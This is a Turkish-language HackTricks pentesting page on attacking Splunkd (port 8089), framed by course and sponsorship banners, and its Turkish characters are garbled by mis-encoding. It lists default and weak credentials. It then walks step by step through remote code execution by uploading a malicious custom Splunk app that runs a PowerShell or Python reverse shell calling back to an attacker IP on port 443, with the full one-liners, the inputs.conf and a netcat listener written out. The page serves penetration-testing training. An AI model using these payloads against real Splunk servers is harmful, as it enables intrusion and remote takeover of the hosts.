# 8089 - Splunkd Pentest Etme

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'ler**]'imiz(https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>

## **Temel Bilgiler**

Splunk, **log analiz aracÄ±** olan ve **verileri toplama, analiz etme ve gÃ¶rselleÅŸtirme**de Ã¶nemli bir rol oynayan bir araÃ§tÄ±r. Ä°lk amacÄ± **SIEM (GÃ¼venlik Bilgi ve Olay YÃ¶netimi)** aracÄ± olarak hizmet vermek olmasa da, **gÃ¼venlik izleme** ve **iÅŸ analitiÄŸi** alanÄ±nda popÃ¼lerlik kazanmÄ±ÅŸtÄ±r.

Splunk daÄŸÄ±tÄ±mlarÄ± genellikle **duyarlÄ± verileri** depolamak iÃ§in kullanÄ±lÄ±r ve sistem ele geÃ§irilirse potansiyel saldÄ±rganlar iÃ§in **deÄŸerli bir bilgi kaynaÄŸÄ±** olabilir. **VarsayÄ±lan port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk web sunucusu varsayÄ±lan olarak 8000 numaralÄ± portta Ã§alÄ±ÅŸÄ±r**.
{% endhint %}

## NumaralandÄ±rma

### Ãœcretsiz SÃ¼rÃ¼m

Splunk Enterprise deneme sÃ¼rÃ¼mÃ¼, **60 gÃ¼n sonra Ã¼cretsiz bir sÃ¼rÃ¼me dÃ¶nÃ¼ÅŸÃ¼r**, bu sÃ¼rÃ¼m **kimlik doÄŸrulamasÄ± gerektirmez**. Sistem yÃ¶neticilerinin Splunk'u denemek iÃ§in deneme sÃ¼rÃ¼mÃ¼nÃ¼ yÃ¼klemesi ve daha sonra unutmasÄ± oldukÃ§a yaygÄ±ndÄ±r. Bu otomatik olarak kimlik doÄŸrulamasÄ± olmayan Ã¼cretsiz sÃ¼rÃ¼me dÃ¶nÃ¼ÅŸecektir ve bu da Ã§evrede bir gÃ¼venlik aÃ§Ä±ÄŸÄ± oluÅŸturacaktÄ±r. BazÄ± organizasyonlar bÃ¼tÃ§e kÄ±sÄ±tlamalarÄ± nedeniyle Ã¼cretsiz sÃ¼rÃ¼mÃ¼ tercih edebilir, ancak kullanÄ±cÄ±/rol yÃ¶netiminin olmamasÄ±nÄ±n getirdiÄŸi sonuÃ§larÄ± tam olarak anlamayabilirler.

### VarsayÄ±lan Kimlik Bilgileri

Eski Splunk sÃ¼rÃ¼mlerinde, varsayÄ±lan kimlik bilgileri **`admin:changeme`** olarak ayarlanmÄ±ÅŸtÄ±r ve bu bilgiler giriÅŸ sayfasÄ±nda kolayca gÃ¶rÃ¼ntÃ¼lenir.\
Ancak, **en son Splunk sÃ¼rÃ¼mÃ¼** kurulum sÃ¼recinde **kimlik bilgilerini ayarlar**. VarsayÄ±lan kimlik bilgileri Ã§alÄ±ÅŸmÄ±yorsa, `admin`, `Welcome`, `Welcome1`, `Password123` gibi yaygÄ±n zayÄ±f ÅŸifreler iÃ§in kontrol etmek faydalÄ± olabilir.

### Bilgi Edinme

Splunk'a giriÅŸ yaptÄ±ktan sonra, verileri **inceleyebilir**, **raporlar Ã§alÄ±ÅŸtÄ±rabilir**, **panolar oluÅŸturabilir**, Splunkbase kÃ¼tÃ¼phanesinden **uygulamalarÄ± yÃ¼kleyebilir** ve Ã¶zel uygulamalarÄ± yÃ¼kleyebilirsiniz.\
AyrÄ±ca kod Ã§alÄ±ÅŸtÄ±rabilirsiniz: Splunk'un, sunucu tarafÄ±nda Django uygulamalarÄ±, REST uÃ§ noktalarÄ±, betikli giriÅŸler ve uyarÄ± betikleri gibi **kod Ã§alÄ±ÅŸtÄ±rma yÃ¶ntemleri** bulunmaktadÄ±r. Splunk sunucusunda uzaktan kod yÃ¼rÃ¼tme saÄŸlamanÄ±n yaygÄ±n bir yolu, betikli giriÅŸlerin kullanÄ±lmasÄ±dÄ±r.

AyrÄ±ca, Splunk'un Windows veya Linux ana bilgisayarlarÄ±na yÃ¼klenebileceÄŸi gÃ¶z Ã¶nÃ¼ne alÄ±ndÄ±ÄŸÄ±nda, betikli giriÅŸler Bash, PowerShell veya Batch betiklerini Ã§alÄ±ÅŸtÄ±rmak iÃ§in oluÅŸturulabilir.

### Shodan

* `Splunk yapÄ±`

## Uzaktan Kod YÃ¼rÃ¼tme (RCE)

### Ã–zel Uygulama OluÅŸturma

Ã–zel bir uygulama **Python, Batch, Bash veya PowerShell betikleri** Ã§alÄ±ÅŸtÄ±rabilir.\
**Splunk'un Python'u yÃ¼klÃ¼** geldiÄŸine dikkat edin, bu nedenle **Windows** sistemlerinde bile python kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz.

Bize yardÄ±mcÄ± olmasÄ± iÃ§in [**bu**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paketini kullanabilirsiniz. Bu depodaki **`bin`** dizininde [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ve [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) iÃ§in Ã¶rnekler bulunmaktadÄ±r. Bu adÄ±mlarÄ± adÄ±m adÄ±m takip edelim.

Bunu baÅŸarmak iÃ§in Ã¶ncelikle aÅŸaÄŸÄ±daki dizin yapÄ±sÄ±nÄ± kullanarak Ã¶zel bir Splunk uygulamasÄ± oluÅŸturmamÄ±z gerekmektedir:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** dizini, Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§ladÄ±ÄŸÄ±mÄ±z **betikleri** iÃ§erecektir (bu durumda, bir **PowerShell** ters kabuk), ve varsayÄ±lan dizinde `inputs.conf` dosyamÄ±z olacak. Ters kabuÄŸumuz bir **PowerShell tek satÄ±rlÄ±k komutu** olacaktÄ±r:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Dosya [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf), Splunk'a **hangi betiÄŸi Ã§alÄ±ÅŸtÄ±racaÄŸÄ±nÄ±** ve diÄŸer koÅŸullarÄ± sÃ¶yler. Burada uygulamayÄ± etkinleÅŸtirdik ve Splunk'a betiÄŸi her 10 saniyede bir Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± sÃ¶yledik. AralÄ±k her zaman saniye cinsindendir ve giriÅŸ (betik) yalnÄ±zca bu ayar mevcut olduÄŸunda Ã§alÄ±ÅŸacaktÄ±r.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Ä°htiyacÄ±mÄ±z olan `.bat` dosyasÄ±, uygulama daÄŸÄ±tÄ±ldÄ±ÄŸÄ±nda Ã§alÄ±ÅŸacak ve PowerShell tek satÄ±rlÄ±k komutunu yÃ¼rÃ¼tecek.

Bir sonraki adÄ±m, `Dosyadan uygulama yÃ¼kle`'yi seÃ§mek ve uygulamayÄ± yÃ¼klemek.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

ZararlÄ± Ã¶zel uygulamayÄ± yÃ¼klemeden Ã¶nce, Netcat veya [socat](https://linux.die.net/man/1/socat) kullanarak bir dinleyici baÅŸlatalÄ±m.
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
`Uygulama YÃ¼kle` sayfasÄ±nda `GÃ¶z at`a tÄ±klayÄ±n, daha Ã¶nce oluÅŸturduÄŸumuz tarball'Ä± seÃ§in ve `YÃ¼kle`'ye tÄ±klayÄ±n. UygulamayÄ± yÃ¼klediÄŸimiz anda, uygulamanÄ±n durumu otomatik olarak `Etkin` olarak deÄŸiÅŸeceÄŸi iÃ§in bir **ters kabuk** alÄ±nÄ±r.

#### Linux

EÄŸer bir **Linux ana bilgisayar** ile uÄŸraÅŸÄ±yorsak, Ã¶zel kÃ¶tÃ¼ amaÃ§lÄ± uygulamayÄ± oluÅŸturmadan Ã¶nce `rev.py` Python betiÄŸini **dÃ¼zenlememiz** gerekecektir. Geri kalan sÃ¼reÃ§ aynÄ± olacaktÄ± ve Netcat dinleyicimizde ters kabuk baÄŸlantÄ±sÄ± alacak ve yarÄ±ÅŸa baÅŸlayacaktÄ±k.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE) ve Yetki YÃ¼kseltme

AÅŸaÄŸÄ±daki sayfada, bu servisin nasÄ±l kÃ¶tÃ¼ye kullanÄ±larak yetki yÃ¼kseltme ve kalÄ±cÄ±lÄ±k elde edilebileceÄŸine dair bir aÃ§Ä±klama bulabilirsiniz:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>SÄ±fÄ±rdan Kahramana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na (https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
